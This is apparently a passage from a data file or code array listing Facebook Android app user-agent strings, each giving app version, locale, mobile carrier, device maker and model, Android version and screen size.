"[FBAN/FB4A;FBAV/331.1.0.29.117;FBBV/310595753;FBDM/{density=2.625,width=1080,height=2131};FBLC/ru_RU;FBRV/0;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FM;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=3.0,width=1080,height=2177};FBLC/ru_RU;FBRV/333688086;FBCR/25030;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A325F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/331.1.0.29.117;FBBV/310595742;FBDM/{density=3.375,width=1080,height=2139};FBLC/ru_RU;FBRV/0;FBCR/MTS RUS;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/HRY-LX1T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672635;FBDM/{density=3.375,width=1080,height=2139};FBLC/ru_RU;FBRV/314845422;FBCR/MegaFon;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/HRY-LX1T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335949376;FBDM/{density=2.0,width=1200,height=1824};FBLC/ru_RU;FBRV/337407751;FBCR/;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/MI PAD 4;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/319.0.0.39.120;FBBV/292233360;FBDM/{density=3.0,width=1080,height=2038};FBLC/ru_RU;FBRV/293712062;FBCR/Beeline;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/BND-L21;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957728;FBDM/{density=3.375,width=1080,height=2139};FBLC/ru_RU;FBRV/335491355;FBCR/MegaFon;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/POT-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957731;FBDM/{density=1.75,width=720,height=1423};FBLC/ru_RU;FBRV/334626402;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205FN;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/330.0.0.31.120;FBBV/308809026;FBDM/{density=2.75,width=1080,height=2134};FBLC/ru_RU;FBRV/309956148;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950341;FBDM/{density=3.75,width=1440,height=2718};FBLC/ru_RU;FBRV/337135836;FBCR/MegaFon RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/347.0.0.28.237;FBBV/337279586;FBDM/{density=2.75,width=1080,height=2130};FBLC/ru_RU;FBRV/0;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/330.0.0.31.120;FBBV/308809026;FBDM/{density=3.1875,width=1080,height=2156};FBLC/ru_RU;FBRV/310739136;FBCR/Tele2;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A715F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/330.0.0.31.120;FBBV/308809026;FBDM/{density=2.75,width=1080,height=2132};FBLC/ru_RU;FBRV/0;FBCR/Tele2;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2010J19SY;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621606;FBDM/{density=3.0,width=1080,height=1920};FBLC/ru_RU;FBRV/303418653;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.625,width=1080,height=2186};FBLC/ru_RU;FBRV/334763932;FBCR/beeline;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A525F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950338;FBDM/{density=2.625,width=1080,height=2183};FBLC/ru_RU;FBRV/336753343;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A715F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672688;FBDM/{density=3.0,width=1080,height=2016};FBLC/ru_RU;FBRV/0;FBCR/Beeline;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/H8266;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/330.0.0.31.120;FBBV/308809026;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/310399448;FBCR/Beeline;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480892;FBDM/{density=2.0,width=720,height=1369};FBLC/ru_RU;FBRV/302048709;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 8;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803889;FBDM/{density=2.625,width=1080,height=2186};FBLC/lt_LT;FBRV/271519795;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/327.0.0.33.120;FBBV/304400874;FBDM/{density=3.0,width=1080,height=2110};FBLC/ru_RU;FBRV/0;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A405FM;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919016;FBDM/{density=3.0,width=1080,height=2180};FBLC/he_IL;FBRV/344561895;FBCR/HOT mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A705FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919016;FBDM/{density=2.75,width=1080,height=2167};FBLC/he_IL;FBRV/344561895;FBCR/Cellcom;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/21061119AG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/329.0.0.29.120;FBBV/307279835;FBDM/{density=2.625,width=1080,height=2195};FBLC/ru_RU;FBRV/308185973;FBCR/UA-KYIVSTAR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A325F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293906205;FBDM/{density=1.75,width=720,height=1396};FBLC/ru_RU;FBRV/296240860;FBCR/Tele2;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J415FN;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076526;FBDM/{density=2.75,width=1080,height=2130};FBLC/ru_RU;FBRV/303731543;FBCR/MGTS;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/316.0.0.54.116;FBBV/287518980;FBDM/{density=3.0,width=1080,height=2130};FBLC/ru_RU;FBRV/0;FBCR/Tele2 RU;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1915;FBSV/11;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/318.0.0.39.154;FBBV/290427340;FBDM/{density=2.8812501,width=1080,height=2134};FBLC/ru_RU;FBRV/0;FBCR/MegaFon Fastest;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2004J19C;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.625,width=1080,height=2131};FBLC/ru_RU;FBRV/334947106;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M215F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957376;FBDM/{density=3.0,width=1080,height=2107};FBLC/ru_RU;FBRV/334986349;FBCR/MegaFon #1;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/MAR-LX1H;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/322.0.0.35.121;FBBV/297186794;FBDM/{density=2.25,width=720,height=1280};FBLC/ru_RU;FBRV/298964384;FBCR/Beeline;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J530FM;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950287;FBDM/{density=2.25,width=720,height=1280};FBLC/ru_RU;FBRV/337041504;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G570F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957695;FBDM/{density=2.0,width=1200,height=1824};FBLC/ru_RU;FBRV/0;FBCR/MTS RUS;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo TB-X605L;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/334.0.0.32.119;FBBV/314823210;FBDM/{density=2.0,width=720,height=1280};FBLC/ru_RU;FBRV/0;FBCR/MAGTI-GSM-GEO | MegaFon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J510FN;FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950287;FBDM/{density=2.625,width=1080,height=1920};FBLC/ru_RU;FBRV/337277111;FBCR/;FBMF/Coolpad;FBBD/Coolpad;FBPN/com.facebook.katana;FBDV/C1-U02;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950338;FBDM/{density=2.625,width=1080,height=2131};FBLC/ru_RU;FBRV/336887922;FBCR/Beeline;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M215F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919003;FBDM/{density=1.75,width=720,height=1381};FBLC/en_GB;FBRV/344623273;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A107F;FBSV/11;FBBK/1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338918983;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J337T;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/349.0.0.39.470;FBBV/344633543;FBDM/{density=3.0,width=1080,height=2107};FBLC/en_GB;FBRV/345048153;FBCR/3;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919014;FBDM/{density=1.5,width=800,height=1268};FBLC/fr_FR;FBRV/344143399;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T220;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950338;FBDM/{density=3.0,width=1080,height=2178};FBLC/en_US;FBRV/337672225;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G981V;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/349.0.0.39.470;FBBV/344633542;FBDM/{density=2.0,width=720,height=1440};FBLC/es_ES;FBRV/345212163;FBCR/TELCEL;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2239;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987623;FBDM/{density=1.75,width=720,height=1280};FBLC/en_US;FBRV/277740997;FBCR/Boost Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J737P;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919016;FBDM/{density=2.25,width=720,height=1548};FBLC/zh_HK;FBRV/344623273;FBCR/SUN Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A4260;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919016;FBDM/{density=2.625,width=1080,height=2094};FBLC/zh_HK;FBRV/344561895;FBCR/CMHK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N9600;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/349.0.0.39.470;FBBV/344633543;FBDM/{density=3.0,width=1080,height=2168};FBLC/lv_LV;FBRV/345461930;FBCR/LMT;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A525F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/349.0.0.39.470;FBBV/344633538;FBDM/{density=1.875,width=720,height=1465};FBLC/ru_RU;FBRV/345557387;FBCR/LV TELE2;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A125F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/349.0.0.39.470;FBBV/344633538;FBDM/{density=2.8125,width=1080,height=2173};FBLC/en_US;FBRV/345131829;FBCR/Spectrum;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N981U;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/349.0.0.39.470;FBBV/344633543;FBDM/{density=3.375,width=1080,height=2058};FBLC/zh_HK;FBRV/344972711;FBCR/CMHK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A9200;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/310.0.0.50.118;FBBV/278533668;FBDM/{density=3.0,width=1080,height=2060};FBLC/zh_CN;FBRV/280683996;FBCR/CMHK;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ANE-LX2;FBSV/9;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/349.0.0.39.470;FBBV/344633543;FBDM/{density=2.25,width=1600,height=2452};FBLC/zh_HK;FBRV/0;FBCR/csl.;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T725C;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338918980;FBDM/{density=1.125,width=480,height=906};FBLC/en_US;FBRV/344561895;FBCR/Home;FBMF/BLU;FBBD/BLU;FBPN/com.facebook.katana;FBDV/VIEW 1;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/349.0.0.39.470;FBBV/344633543;FBDM/{density=2.625,width=1080,height=2183};FBLC/en_US;FBRV/345419331;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A715F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/349.0.0.39.470;FBBV/344633543;FBDM/{density=2.625,width=1080,height=2123};FBLC/en_US;FBRV/344972711;FBCR/U.S. Cellular;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N986U;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950334;FBDM/{density=1.875,width=720,height=1465};FBLC/es_LA;FBRV/337672225;FBCR/Metro by T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A326U;FBSV/11;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/349.0.0.39.470;FBBV/344633543;FBDM/{density=2.625,width=1080,height=2279};FBLC/en_US;FBRV/345721910;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/motorola one 5G UW;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/341.0.0.30.73;FBBV/326471163;FBDM/{density=2.625,width=1080,height=2198};FBLC/zh_HK;FBRV/0;FBCR/csl.;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A7050;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/349.0.0.39.470;FBBV/344633395;FBDM/{density=3.0,width=1080,height=1808};FBLC/zh_HK;FBRV/344972711;FBCR/HKBN;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ALP-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919016;FBDM/{density=2.625,width=1080,height=2186};FBLC/zh_HK;FBRV/344682840;FBCR/SUN Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A5260;FBSV/11;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919016;FBDM/{density=2.8125,width=1080,height=2410};FBLC/zh_HK;FBRV/344561895;FBCR/CMHK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-F700F;FBSV/11;FBBK/1;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/349.0.0.35.470;FBBV/344066959;FBDM/{density=1.875,width=720,height=1458};FBLC/zh_HK;FBRV/0;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A4260;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/349.0.0.39.470;FBBV/344633543;FBDM/{density=2.625,width=1080,height=2200};FBLC/en_US;FBRV/345704793;FBCR/ALDImobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G988B;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/349.0.0.39.470;FBBV/344633543;FBDM/{density=2.625,width=1080,height=2189};FBLC/ru_RU;FBRV/346072910;FBCR/BITE&#17-LV;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N770F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/350.1.0.29.106;FBBV/345721183;FBDM/{density=3.375,width=1080,height=2002};FBLC/he_IL;FBRV/0;FBCR/Cellcom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G970F;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/311606705;FBDM/{density=1.0,width=600,height=976};FBLC/en_GB;FBRV/314125016;FBCR/;FBMF/Lenovo;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo TB3-710F;FBSV/5.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/349.0.0.39.470;FBBV/345417414;FBDM/{density=2.0,width=720,height=1384};FBLC/es_LA;FBRV/0;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J410G;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"Dalvik/2.1.0 (Linux; U; Android 11; SM-A326U Build/RP1A.200720.012) [FBAN/FB4A;FBAV/348.0.0.39.118;FBPN/com.facebook.katana;FBLC/en_US;FBBV/338919009;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-A326U;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=1.875,width=720,height=1465};FB_FW/1;FBRV/0;]",
"Mozilla/5.0 (Linux; Android 11; SM-A326U Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919009;FBDM/{density=1.875,width=720,height=1465};FBLC/en_US;FBRV/0;FB_FW/2;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A326U;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/349.0.0.39.470;FBBV/344633543;FBDM/{density=2.625,width=1080,height=2195};FBLC/en_US;FBRV/346010056;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A315G;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/350.1.0.29.106;FBBV/345721203;FBDM/{density=3.0,width=1080,height=2110};FBLC/lv_LV;FBRV/347034741;FBCR/LMT;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A405FN;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/311606716;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/0;FBCR/handyvertrag.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9515;FBSV/5.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/350.1.0.29.106;FBBV/345721203;FBDM/{density=2.8125,width=1080,height=2177};FBLC/he_IL;FBRV/347114709;FBCR/Pelephone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A525F;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/350.1.0.29.106;FBBV/345721177;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_Qaau_GB;FBRV/347199263;FBCR/Digi;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/350.1.0.29.106;FBBV/345721203;FBDM/{density=2.75,width=1080,height=2167};FBLC/he_IL;FBRV/347149499;FBCR/Cellcom;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/21061119AG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/350.1.0.29.106;FBBV/345721203;FBDM/{density=3.0,width=1080,height=2161};FBLC/en_GB;FBRV/346643560;FBCR/EE;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2207;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/350.1.0.29.106;FBBV/345721201;FBDM/{density=1.875,width=720,height=1465};FBLC/es_LA;FBRV/346377899;FBCR/cricket;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A125U;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/351.0.0.38.117;FBBV/347007278;FBDM/{density=3.0625,width=1080,height=2130};FBLC/ru_RU;FBRV/0;FBCR/BITE;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/350.1.0.29.106;FBBV/345721203;FBDM/{density=3.0,width=1080,height=2107};FBLC/he_IL;FBRV/346213221;FBCR/Pelephone;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/351.0.0.38.117;FBBV/347007278;FBDM/{density=2.625,width=1080,height=2064};FBLC/he_IL;FBRV/0;FBCR/Cellcom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N970F;FBSV/12;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/351.0.0.38.117;FBBV/347007278;FBDM/{density=2.625,width=1080,height=2042};FBLC/en_US;FBRV/0;FBCR/Pelephone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/351.0.0.38.117;FBBV/347007278;FBDM/{density=3.075,width=1080,height=2230};FBLC/en_US;FBRV/347407993;FBCR/ ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g stylus (2021);FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/350.1.0.29.106;FBBV/345721183;FBDM/{density=3.0,width=1080,height=2076};FBLC/es_LA;FBRV/347149499;FBCR/Metro by T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/351.0.0.38.117;FBBV/347007250;FBDM/{density=3.0,width=1080,height=2076};FBLC/lv_LV;FBRV/348073022;FBCR/Bite;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A530F;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/350.1.0.29.106;FBBV/345721203;FBDM/{density=3.0,width=1080,height=2158};FBLC/it_IT;FBRV/347370140;FBCR/vodafone IT;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2161;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/350.1.0.29.106;FBBV/345721183;FBDM/{density=2.625,width=2034,height=1080};FBLC/en_US;FBRV/347281776;FBCR/;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LGL722DL;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/351.0.0.38.117;FBBV/347007278;FBDM/{density=3.0,width=1080,height=2178};FBLC/he_IL;FBRV/348073022;FBCR/Cellcom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G980F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/351.0.0.38.117;FBBV/347007269;FBDM/{density=2.0,width=720,height=1459};FBLC/en_US;FBRV/347950808;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A125U;FBSV/11;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/351.0.0.38.117;FBBV/347007278;FBDM/{density=3.0,width=1080,height=2181};FBLC/en_US;FBRV/348041545;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G996U;FBSV/12;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]",
